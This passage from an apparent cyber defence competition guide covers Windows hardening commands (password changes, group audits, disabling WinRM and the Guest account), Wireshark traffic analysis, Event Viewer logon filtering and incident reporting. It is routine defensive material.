
12. Check who is currently logged into the machine.
```bash 
who
```
<br>

## System Hardening for Windows
---

1. Change **all** user passwords. *Yes, especially the credentials given to you!*
```powershell
net user <username> <password>` NOTE: If domain user, append `/domain
```
2. Audit important groups.
```powershell
net localgroup Administrators
```
```powershell
net localgroup "Remote Desktop Users"
```
```powershell
net localgroup "Remote Management Users"`
```

3. Disable WinRM if not needed through powershell.
```powershell 
Disable-PSRemoting -Force
```
4. Check Windows Defender registry keys

    `regedit.exe`  HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender

5. Check for tasks set to run through the registry.

    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
    - HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

6. Check system and user startup folder.
    
    - User: C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
    - System: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\

7. Audit scheduled tasks.
```powershell
schtasks
```

8. Check PowerShell Execution policy.
```powershell
Get-ExecutionPolicy
```
```powershell
Set-ExecutionPolicy -ExecutionPolicy Restricted -Scope LocalMachine
```

9. Check Windows Defender status.
```powershell
Get-MPComputerStatus
```

10. Audit SMB shares.
```powershell
net view \\127.0.0.1
```

11. Disable Guest account.
```powershell
net user guest /active no
```

---
# Attack Phase of the Competition
---

## Sniffing Network Traffic
conducting thorough traffic analysis, often referred to as “sniffing,” is crucial for detecting anomalous or potentially malicious data packets. This aids in identifying unauthorized access attempts or suspicious activities within the network. It empowers network administrators to uncover exploited network vulnerabilities and reconstruct cyber-attack scenarios for future security enhancements and historical incident analysis.

### Wireshark

**Download Windows**:
Navigate to https://www.wireshark.org/download.html and download the installer

**Download Linux**:
```bash
sudo apt-get install wireshark
```

1. Open the application and click through the steps within the wizard to install the application on your machine
2. From the wireshark welcome page, click the interface that your hosts reside on.
3. Utlize display filters to sniff for traffic by ip address or by service
  <img src="https://i.imgur.com/xAZwCgT.png">

4. Review the captured packets for unusual patterns or anomalies. A ping request may be considered suspicious if coming from an unknown IP
   <img src="https://i.imgur.com/bM2asWh.png">
   
5. You can view more information of the sender and receiver as well as the raw packet itself by double clicking the entry
   <img src="blob:https://imgur.com/8d7c31ba-ead1-4051-821e-4ac3bf390890">

Here's an example of suspcious activity:

**Flood of ARP Request**
 <img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZJaf1LYXoXq-Y5uQXSkoCQ.png">

## Analyzing logs
In the context of system security, maintaining detailed logs is beneficial for identifying unsuccessful or potentially dubious login attempts, as well as unauthorized activities by users or processes. This enables system administrators to spot exploited weaknesses and reconstruct attack scenarios for future security updates and historical incident documentation.
### Understanding Windows Event Viewer
1. Type Windows + R and enter `eventvwr` to open the Windows Event Viewer
<img src="https://i.imgur.com/5CwB4fi.png">

2. The `Overview and Summary` page, provides a quick look at recent logs. Use the left toolbar to sort by log type and the right one to create custom views and filters for specific logs.

<img src="https://i.imgur.com/URwalg5.png">

3. Navigate to security events 

<img src="https://i.imgur.com/bMwKoaO.png">

4. In this example we are gonna filter for specific event regarding user logons. You can find other task IDs relevant to security at this [link](https://andreafortuna.org/2019/06/12/windows-security-event-logs-my-own-cheatsheet/)

<img src="https://i.imgur.com/BCkHCVG.png">

5. We are gonna filter this event further and focus on auditing specifically administrator logons 

<img src="https://i.imgur.com/BCkHCVG.png">

6.Within this result we see and unfamiliar IP address of origin as well as that they used NTLM to authenticate themselves within the system. The NTLM protocol is stores password within windows which introduces a security threat. Moreover, it has been replaced by Kerberos a more reliable solution that utilizes a centralized logon server

<img src="https://i.imgur.com/Wc4HYQE.png">
 <br>


## Reporting

1. Identify the security threat or incident. This could be an unauthorized access, data breach, malware attack, or any other form of cyber threat.

2. Document all relevant information about the incident. This includes the time and date of the incident, the nature of the threat, the systems affected, and any potential data that may have been compromised, as well as screenshots and diagrams. If you do not fully understand the details of the attack, describe to the best of your abilities the nature of the threat.

3. Contain the threat if possible to prevent further damage. This could involve disconnecting affected systems from the network or shutting down certain services.

4. Be sure to turn in all documentation before the deadline, see the Example Documentation folder for a good template to follow
